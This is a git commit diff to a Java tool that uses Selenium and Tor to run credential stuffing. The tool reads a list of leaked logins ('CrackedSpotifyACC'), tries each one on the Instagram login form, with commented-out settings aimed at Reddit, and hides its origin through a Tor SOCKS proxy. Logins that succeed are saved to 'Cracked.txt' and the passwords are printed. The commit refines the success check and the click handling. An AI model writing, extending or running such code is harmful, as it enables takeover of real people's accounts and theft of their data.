f76d2071c796169ffaa3d2a9db85a6880c51bd7a
tomek <tomek@inscende.de>
2020-12-23 22:16:51 +0100

    -> nothing

--- src/main/java/Main.java
+++ src/main/java/Main.java
@@ -22,18 +22,20 @@ public class Main {
 
     public static void main(String[] args) throws IOException {
         Handler handler = new TorHandler();
-        File myObj = new File("E:\\NextSync\\Aufträge\\test.txt");
+        File myObj = new File("E:\\NextSync\\Aufträge\\Cracked.txt");
         LoginList list = FileHandler.readFile("E:\\NextSync\\Aufträge\\CrackedSpotifyACC");
         LoginDom dom = new LoginDom("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[1]/div/label/input", "/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[2]/div/label/input", "/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[3]/button", "/html/body/div[2]/div/div/div/div[2]/button[1]", "https://www.instagram.com/","/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[2]");
+        //LoginDom dom = new LoginDom("/html/body/div/div/div/div[2]/main/div/div/div[1]/form/div/div[1]/label/div/div[2]/div/input", "/html/body/div/div/div/div[2]/main/div/div/div[1]/form/div/div[2]/label/div/div[2]/div/input", "/html/body/div/div/div/div[2]/main/div/div/div[1]/form/div/div[3]/div/div", null, "https://whatismyipaddress.com/de/meine-ip", "/html/body/div/div/div/div[2]/main/div/div/div[1]");
+        //LoginDom dom = new LoginDom("//*[@id=\"loginUsername\"]","//*[@id=\"loginPassword\"]","/html/body/div/main/div[1]/div/div[2]/form/fieldset[5]/button",null,"https://www.reddit.com/login/?dest=https%3A%2F%2Fwww.reddit.com%2F","/html/body/div/main/div[1]/div/div[2]/form/fieldset[2]/div");
         try {
-            for (int i = 0; i < list.list.size(); i++) {
+            for (int i = 0; i < list.list.size(); i++) {//https://www.reddit.com/login/?dest=https%3A%2F%2Fwww.reddit.com%2F
                 if (handler.getResponse(list.list.get(i), dom)) {
                     FileHandler.addAcc(myObj, list.list.get(i));
                     System.out.println("Username: " + list.list.get(i).username + "  Password: " + list.list.get(i).password);
-                    System.out.println("Status: ["+ANSI_GREEN+"SUCCESS"+ANSI_RESET+"]");
+                    System.out.println("Status: [" + ANSI_GREEN + "SUCCESS" + ANSI_RESET + "]");
                 } else {
                     System.out.println("Username: " + list.list.get(i).username + "  Password: " + list.list.get(i).password);
-                    System.out.println("Status: ["+ANSI_RED+"FAILED"+ANSI_RESET+"]");
+                    System.out.println("Status: [" + ANSI_RED + "FAILED" + ANSI_RESET + "]");
                 }
             }
         } catch (IOException e) {
--- src/main/java/Network/TorHandler.java
+++ src/main/java/Network/TorHandler.java
@@ -21,15 +21,14 @@ public class TorHandler implements Handler {
         System.setProperty("webdriver.gecko.driver", "geckodriver.exe");
         String torBinaryPath = "C:\\Users\\airph\\Desktop\\Tor Browser\\Browser\\firefox.exe";
         Runtime runTime = Runtime.getRuntime();
-        torProcess = runTime.
-                exec(torBinaryPath + " -f");
+        torProcess = runTime.exec(torBinaryPath + " -f");
         FirefoxProfile profile = new FirefoxProfile();
         profile.setPreference("network.proxy.type", 1);
         profile.setPreference("network.proxy.socks", "127.0.0.1");
         profile.setPreference("network.proxy.socks_port", 9150);
         FirefoxOptions firefoxOptions = new FirefoxOptions();
         firefoxOptions.setProfile(profile);
-        firefoxOptions.setHeadless(true);
+        //firefoxOptions.setHeadless(true);
         driver = new FirefoxDriver(firefoxOptions);
         driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
         driver.manage().window().maximize();
@@ -43,9 +42,11 @@ public class TorHandler implements Handler {
 
         WebElement username = wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath(domModel.usernameXPath)));
         WebElement pwd = wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath(domModel.passwordXPath)));
-        try {
-            driver.findElement(By.xpath(domModel.checkForXPath)).click();
-        } catch (ElementNotVisibleException | NoSuchElementException e) {
+        if (domModel.checkForXPath != null) {
+            try {
+                driver.findElement(By.xpath(domModel.checkForXPath)).click();
+            } catch (ElementNotVisibleException | NoSuchElementException e) {
+            }
         }
 
         username.sendKeys(person.username);
@@ -53,17 +54,20 @@ public class TorHandler implements Handler {
 
         // Locate the login button and click on it
         WebElement button = wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath(domModel.loginXPath)));
-        button.click();
+        wait.until(ExpectedConditions.elementToBeClickable(By.xpath(domModel.loginXPath))).click();
         try {
             WebDriverWait waitS = new WebDriverWait(driver, 5);
             waitS.until(ExpectedConditions.visibilityOfElementLocated(By.xpath(domModel.message)));
+            return false;
         } catch (NoSuchElementException | TimeoutException e) {
+            return true;
+
         }
-        if (driver.getCurrentUrl().equals(domModel.url)) {
+       /* if (driver.getCurrentUrl().equals(domModel.url)) {
             return false;
         } else {
             return true;
-        }
+        }*/
 
     }
 }
